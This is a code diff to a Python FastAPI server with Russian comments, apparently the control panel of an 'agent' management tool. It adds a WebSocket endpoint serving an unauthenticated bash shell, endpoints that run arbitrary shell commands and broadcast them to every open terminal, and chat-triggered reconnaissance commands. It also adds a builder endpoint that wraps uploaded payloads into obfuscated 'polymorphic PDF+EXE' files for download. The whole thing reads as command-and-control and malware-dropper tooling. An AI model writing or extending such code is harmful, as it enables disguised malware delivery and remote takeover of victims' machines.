@@ -15,16 +15,26 @@ import inspect
 import uuid
 import base64
 import subprocess
-from typing import Dict, Any, List, Optional, Union
+import threading
+import asyncio
+import signal
+import pty
+import fcntl
+import struct
+import termios
+from typing import Dict, Any, List, Optional, Union, Set
 from datetime import datetime
 import argparse
+import shutil
+import tempfile
 
-from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response
+from fastapi import FastAPI, HTTPException, Request, Depends, Form, UploadFile, File, BackgroundTasks, status, Response, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
 from fastapi.middleware.cors import CORSMiddleware
 import uvicorn
+from starlette.responses import FileResponse
 
 # Add parent directory to import monitor
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -121,6 +131,155 @@ telegram_client = APIFactory.get_telegram_integration()
 
 # Create a director for uploads if it doesn't exist
 os.makedirs("uploads", exist_ok=True)
+
+# Терминальные сессии и их сокеты
+terminal_sessions: Dict[str, Dict[str, Any]] = {}
+
+@app.websocket("/api/agent/terminal/ws")
+async def terminal_websocket(websocket: WebSocket):
+    """WebSocket endpoint for terminal communication."""
+    # Accept the WebSocket connection
+    await websocket.accept()
+    
+    # Генерируем уникальный ID для терминальной сессии
+    session_id = str(uuid.uuid4())
+    
+    # Переменные для хранения PTY
+    master_fd = None
+    slave_fd = None
+    shell_process = None
+    
+    try:
+        # Логируем подключение нового терминала
+        logger.info(f"New terminal session connected: {session_id}")
+        
+        # Получаем первое сообщение для resize
+        first_message = await websocket.receive_text()
+        first_message_data = json.loads(first_message)
+        
+        if first_message_data.get("type") == "resize":
+            cols = first_message_data.get("cols", 80)
+            rows = first_message_data.get("rows", 24)
+        else:
+            cols, rows = 80, 24
+        
+        # Создаем новый псевдо-терминал (PTY)
+        master_fd, slave_fd = pty.openpty()
+        
+        # Запускаем оболочку в PTY
+        shell_process = subprocess.Popen(
+            ["/bin/bash"],
+            stdin=slave_fd,
+            stdout=slave_fd,
+            stderr=slave_fd,
+            start_new_session=True,
+            preexec_fn=os.setsid,
+            env=os.environ.copy()
+        )
+        
+        # Установка размера окна терминала
+        fcntl.ioctl(
+            master_fd,
+            termios.TIOCSWINSZ,
+            struct.pack("HHHH", rows, cols, 0, 0)
+        )
+        
+        # Сохраняем сессию в словаре
+        terminal_sessions[session_id] = {
+            "websocket": websocket,
+            "master_fd": master_fd,
+            "slave_fd": slave_fd,
+            "process": shell_process,
+            "cols": cols,
+            "rows": rows,
+            "connected_at": datetime.now()
+        }
+        
+        # Запускаем асинхронные задачи для чтения из PTY и отправки в WebSocket
+        async def read_from_pty():
+            while True:
+                try:
+                    # Пытаемся прочитать данные из PTY
+                    data = os.read(master_fd, 1024)
+                    if not data:
+                        break
+                    
+                    # Отправляем данные в WebSocket
+                    await websocket.send_json({
+                        "type": "output",
+                        "data": data.decode("utf-8", errors="replace")
+                    })
+                except (OSError, BlockingIOError) as e:
+                    if e.errno == 5:  # Input/output error (процесс завершен)
+                        break
+                    await asyncio.sleep(0.01)
+                except Exception as e:
+                    logger.error(f"Terminal error: {str(e)}")
+                    break
+        
+        # Запускаем задачу чтения из PTY
+        asyncio.create_task(read_from_pty())
+        
+        # Основной цикл для обработки сообщений от WebSocket
+        while True:
+            message_text = await websocket.receive_text()
+            message = json.loads(message_text)
+            
+            if message.get("type") == "input":
+                # Записываем входные данные в PTY
+                input_data = message.get("data", "")
+                os.write(master_fd, input_data.encode("utf-8"))
+            
+            elif message.get("type") == "resize":
+                # Обновляем размер окна терминала
+                cols = message.get("cols", terminal_sessions[session_id]["cols"])
+                rows = message.get("rows", terminal_sessions[session_id]["rows"])
+                
+                fcntl.ioctl(
+                    master_fd,
+                    termios.TIOCSWINSZ,
+                    struct.pack("HHHH", rows, cols, 0, 0)
+                )
+                
+                terminal_sessions[session_id]["cols"] = cols
+                terminal_sessions[session_id]["rows"] = rows
+    
+    except WebSocketDisconnect:
+        logger.info(f"Terminal session disconnected: {session_id}")
+    except Exception as e:
+        logger.error(f"Terminal error: {str(e)}")
+    finally:
+        # Закрываем PTY и убиваем процесс оболочки при закрытии WebSocket
+        if session_id in terminal_sessions:
+            if shell_process:
+                try:
+                    # Отправляем сигнал SIGTERM для корректного завершения
+                    os.killpg(os.getpgid(shell_process.pid), signal.SIGTERM)
+                    shell_process.wait(timeout=2)
+                except (subprocess.TimeoutExpired, ProcessLookupError):
+                    # Если процесс не завершился, принудительно убиваем
+                    try:
+                        os.killpg(os.getpgid(shell_process.pid), signal.SIGKILL)
+                    except (ProcessLookupError, OSError):
+                        pass
+            
+            # Закрываем файловые дескрипторы
+            if master_fd:
+                try:
+                    os.close(master_fd)
+                except OSError:
+                    pass
+            
+            if slave_fd:
+                try:
+                    os.close(slave_fd)
+                except OSError:
+                    pass
+            
+            # Удаляем сессию из словаря
+            del terminal_sessions[session_id]
+            
+        logger.info(f"Terminal session {session_id} cleaned up")
 
 def format_uptime(seconds):
     """Format uptime in human readable form"""
@@ -672,25 +831,129 @@ async def chat_with_agent(agent_id: str, request: Request):
     # Record another event for the response
     record_event("response", agent_id, f"Agent executed command. Autonomous mode: {autonomous_mode}")
     
-    # Если включен автономный режим, автоматически выполняем команды
-    # (временная заглушка для демонстрации функциональности)
+    # Информация о результате автономных действий
     autonomous_info = ""
+    
+    # Если включен автономный режим, автоматически выполняем команды
     if autonomous_mode:
-        # Здесь в будущем будет код обработки автономных действий
-        if message.startswith("!exec"):
-            command = message[6:].strip()
-            # Безопасный запуск команды через subprocess
-            try:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
-                autonomous_info = f"\n\n[Автономное выполнение команды: {command}]\n[Результат: {result.stdout}]"
-                if result.stderr:
-                    autonomous_info += f"\n[Ошибка: {result.stderr}]"
-            except Exception as e:
-                autonomous_info = f"\n\n[Ошибка автономного выполнения: {str(e)}]"
-        elif message.lower().startswith("скан") or "scan" in message.lower():
-            autonomous_info = "\n\n[Автономное сканирование окружения...]\n"
-            # Имитация результата сканирования
-            autonomous_info += "[Обнаружены системы: 192.168.1.1 (Router), 192.168.1.100 (Windows), 192.168.1.101 (Linux)]"
+        try:
+            # Импортируем модули для автономного выполнения
+            from agent_thinker import AgentThinker
+            from agent_state import AgentState, OPERATIONAL_MODE_AUTO
+            from agent_memory import AgentMemory
+            
+            # Создаем временные объекты для AgentThinker
+            agent_state = AgentState(agent_id=agent_id)
+            agent_state.set_mode(OPERATIONAL_MODE_AUTO)  # Устанавливаем автономный режим
+            agent_memory = AgentMemory()
+            
+            # Функция для выполнения команд
+            def execute_command(cmd):
+                try:
+                    # Безопасно выполняем команду через subprocess
+                    result = subprocess.run(
+                        cmd, 
+                        shell=True, 
+                        capture_output=True, 
+                        text=True, 
+                        timeout=15
+                    )
+                    
+                    logger.info(f"[Автономное выполнение] {cmd} -> Код: {result.returncode}")
+                    
+                    if result.returncode == 0:
+                        return {
+                            "output": result.stdout,
+                            "error": None,
+                            "exit_code": result.returncode
+                        }
+                    else:
+                        return {
+                            "output": result.stdout,
+                            "error": result.stderr,
+                            "exit_code": result.returncode
+                        }
+                except Exception as e:
+                    logger.error(f"[Автономное выполнение] Ошибка: {str(e)}")
+                    return {
+                        "output": "",
+                        "error": str(e),
+                        "exit_code": -1
+                    }
+            
+            # Создаем Agent Thinker
+            thinker = AgentThinker(
+                state=agent_state,
+                memory=agent_memory,
+                thinking_interval=60,
+                command_callback=execute_command,
+                llm_provider="api",
+                llm_config={
+                    "api_url": "http://localhost:5000/api/agent/llm",
+                    "method": "POST",
+                    "data_template": {"prompt": ""},
+                    "response_field": "response"
+                }
+            )
+            
+            # Получаем контекст сообщения для автономного анализа
+            agent_context = {
+                "user_message": message,
+                "agent_response": response,
+                "chat_history": chat_histories[agent_id][-10:] if len(chat_histories[agent_id]) > 10 else chat_histories[agent_id],
+                "agent_info": agent
+            }
+            
+            # Создаем структуру, имитирующую результат размышления
+            thinking_result = {
+                "success": True,
+                "actions": []
+            }
+            
+            # Определяем действия на основе сообщения пользователя
+            if message.lower().startswith("!exec") or message.lower().startswith("выполни"):
+                # Прямое выполнение команды
+                command = message[5:].strip() if message.lower().startswith("!exec") else message[7:].strip()
+                thinking_result["actions"] = [command]
+            elif any(keyword in message.lower() for keyword in ["scan", "скан", "поиск", "найди", "покажи", "проверь"]):
+                # Автоматически определяем команду сканирования на основе текста
+                if "файл" in message.lower() or "file" in message.lower():
+                    thinking_result["actions"] = ["find / -type f -name \"*.conf\" -o -name \"*.txt\" | grep -v \"/proc/\" | head -n 20"]
+                elif "уязвим" in message.lower() or "vulnerab" in message.lower():
+                    thinking_result["actions"] = ["apt list --installed | grep -E 'openssh|nginx|apache'"]
+                elif "процесс" in message.lower() or "process" in message.lower():
+                    thinking_result["actions"] = ["ps aux | head -n 15"]
+                elif "сеть" in message.lower() or "network" in message.lower():
+                    thinking_result["actions"] = ["netstat -tulpn"]
+                else:
+                    thinking_result["actions"] = ["uname -a && cat /etc/os-release"]
+            
+            # Выполняем запланированные действия
+            autonomous_results = []
+            
+            for cmd in thinking_result["actions"]:
+                logger.info(f"[Автономное выполнение команды] {cmd}")
+                
+                # Выполняем команду
+                result = execute_command(cmd)
+                
+                # Формируем результат
+                cmd_result = f"$ {cmd}\n"
+                if result["output"]:
+                    cmd_result += result["output"]
+                if result["error"]:
+                    cmd_result += f"\nОшибка: {result['error']}"
+                
+                autonomous_results.append(cmd_result)
+            
+            # Формируем информацию о результатах автономных действий
+            if autonomous_results:
+                autonomous_info = "\n\n[Автономное выполнение команд]:\n"
+                autonomous_info += "\n".join(autonomous_results)
+        
+        except Exception as e:
+            logger.error(f"Ошибка при автономном выполнении: {str(e)}")
+            autonomous_info = f"\n\n[Ошибка автономного режима: {str(e)}]"
     
     # Добавляем информацию о результатах автономных действий к ответу
     response_with_autonomous = response + autonomous_info
@@ -1592,6 +1855,196 @@ builder_html = """
 # Сохраняем шаблон builder.html
 with open("templates/builder.html", "w") as f:
     f.write(builder_html)
+
+## Добавляем API для терминальных команд
+
+@app.post("/api/agent/{agent_id}/terminal/command")
+async def execute_terminal_command(agent_id: str, request: Request):
+    """API endpoint for executing a terminal command and returning the result"""
+    # Find the agent
+    agent = None
+    for a in agent_data:
+        if a["agent_id"] == agent_id:
+            agent = a
+            break
+    
+    if not agent:
+        raise HTTPException(status_code=404, detail="Agent not found")
+    
+    if agent["status"] != "active":
+        return {"success": False, "error": "Agent is not active"}
+    
+    # Get the command from the request
+    try:
+        data = await request.json()
+        command = data.get("command", "")
+        
+        if not command:
+            raise HTTPException(status_code=400, detail="Command cannot be empty")
+        
+        # Record the command event
+        record_event("terminal_command", agent_id, f"Terminal command: {command}")
+        
+        # Execute the command
+        try:
+            result = subprocess.run(
+                command, 
+                shell=True, 
+                capture_output=True, 
+                text=True, 
+                timeout=30
+            )
+            
+            return {
+                "success": True,
+                "output": result.stdout,
+                "error": result.stderr,
+                "exit_code": result.returncode
+            }
+        except subprocess.TimeoutExpired:
+            return {
+                "success": False,
+                "output": "",
+                "error": "Command execution timed out (30 seconds)",
+                "exit_code": -1
+            }
+        except Exception as e:
+            logger.error(f"Error executing terminal command: {str(e)}")
+            return {
+                "success": False,
+                "output": "",
+                "error": str(e),
+                "exit_code": -1
+            }
+            
+    except Exception as e:
+        logger.error(f"Invalid request format: {str(e)}")
+        raise HTTPException(status_code=400, detail="Invalid request format")
+
+# API для отправки сообщения в терминал через WebSocket
+@app.post("/api/agent/{agent_id}/terminal/send")
+async def send_to_terminal(agent_id: str, request: Request):
+    """Send a message to all active terminal sessions"""
+    try:
+        data = await request.json()
+        message = data.get("message", "")
+        
+        if not message:
+            raise HTTPException(status_code=400, detail="Message cannot be empty")
+        
+        # Record the event
+        record_event("terminal_send", agent_id, f"Sent message to terminal: {message}")
+        
+        # Count of active terminals
+        active_terminals = 0
+        
+        # Send the message to all active terminal sessions
+        for session_id, session in terminal_sessions.items():
+            try:
+                websocket = session.get("websocket")
+                if websocket:
+                    # Send as input data to the terminal
+                    await websocket.send_json({
+                        "type": "input",
+                        "data": message + "\n"  # Add newline to execute the command
+                    })
+                    active_terminals += 1
+            except Exception as e:
+                logger.error(f"Error sending to terminal {session_id}: {str(e)}")
+        
+        return {
+            "success": True,
+            "message": f"Message sent to {active_terminals} active terminals"
+        }
+    except Exception as e:
+        logger.error(f"Error in send_to_terminal: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+# API для проверки статуса терминала
+@app.get("/api/agent/{agent_id}/terminal/status")
+async def check_terminal_status(agent_id: str):
+    """Check if there are any active terminal sessions for this agent"""
+    # Count active terminal sessions
+    active_sessions = len(terminal_sessions)
+    
+    return {
+        "success": True,
+        "active_sessions": active_sessions,
+        "has_terminal": active_sessions > 0
+    }
+
+@app.post("/api/builder")
+async def build_pdf_exe(
+    payload_file: UploadFile = File(...),
+    pdf_file: UploadFile = File(None),
+    obfuscation_level: int = Form(2),
+    output_file: str = Form("phantom_payload.bin"),
+    template_file: str = Form("stage0.asm")
+):
+    """Собирает полиморфный PDF+EXE через phantom_builder.c"""
+    temp_dir = tempfile.mkdtemp(prefix="builder_")
+    logs = ""
+    try:
+        # Сохраняем payload
+        payload_path = os.path.join(temp_dir, payload_file.filename)
+        with open(payload_path, "wb") as f:
+            shutil.copyfileobj(payload_file.file, f)
+        # Сохраняем PDF если есть
+        pdf_path = None
+        if pdf_file:
+            pdf_path = os.path.join(temp_dir, pdf_file.filename)
+            with open(pdf_path, "wb") as f:
+                shutil.copyfileobj(pdf_file.file, f)
+        # Проверяем шаблон
+        template_path = template_file
+        if not os.path.exists(template_path):
+            # Пробуем искать в templates/
+            alt_path = os.path.join("templates", template_file)
+            if os.path.exists(alt_path):
+                template_path = alt_path
+            else:
+                return {"success": False, "error": f"Шаблон не найден: {template_file}"}
+        # Формируем команду
+        output_path = os.path.join("uploads", output_file)
+        cmd = [
+            "./phantom_builder", # бинарь должен быть собран заранее
+            "--payload", payload_path,
+            "--output", output_path,
+            "--template", template_path,
+            "--obfuscation", str(obfuscation_level)
+        ]
+        if pdf_path:
+            cmd += ["--pdf", pdf_path]
+        # Запускаем билд
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for line in proc.stdout:
+            logs += line
+        proc.wait()
+        success = proc.returncode == 0
+        # Проверяем результат
+        if success and os.path.exists(output_path):
+            download_url = f"/api/builder/download?file={os.path.basename(output_path)}"
+            return {"success": True, "logs": logs, "download_url": download_url}
+        else:
+            return {"success": False, "logs": logs, "error": "Сборка не удалась"}
+    except Exception as e:
+        return {"success": False, "error": str(e), "logs": logs}
+    finally:
+        try:
+            payload_file.file.close()
+            if pdf_file:
+                pdf_file.file.close()
+        except Exception:
+            pass
+
+@app.get("/api/builder/download")
+async def download_built_file(file: str):
+    """Скачивание результата билда только из папки uploads"""
+    safe_dir = os.path.abspath("uploads")
+    file_path = os.path.abspath(os.path.join(safe_dir, file))
+    if not file_path.startswith(safe_dir) or not os.path.exists(file_path):
+        return JSONResponse({"error": "Файл не найден"}, status_code=404)
+    return FileResponse(file_path, filename=os.path.basename(file_path))
 
 if __name__ == "__main__":
     # Обработка аргументов командной строки
